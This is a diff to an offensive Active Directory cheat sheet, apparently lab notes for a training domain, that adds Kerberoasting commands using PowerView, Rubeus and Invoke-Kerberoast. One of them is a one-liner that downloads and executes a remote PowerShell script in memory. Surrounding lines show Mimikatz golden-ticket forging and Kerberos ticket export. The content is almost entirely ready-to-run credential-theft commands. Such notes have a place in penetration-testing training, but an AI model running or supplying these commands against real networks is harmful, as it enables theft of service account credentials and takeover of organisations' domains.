@@ -569,9 +569,19 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Add-Type -AssemblyName System.IdentityModel`
   - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"`
 
+- Using Powerview
 - `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
+- `Request-SPNTicket -SPN "<SPN>"` #Using PowerView `Ex: MSSQLSvc/mgmt.domain.local`
+
+- Using Rubeus
+  - `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+- Using Kerberoast.ps1
+  - `iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")`
+  - `Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast`
 
 - Check if the TGS has been granted
   - `klist`
+  
 - Export all tickets using Mimikatz
   -  `Invoke-Mimikatz -Command '"kerberos::list /export"'`
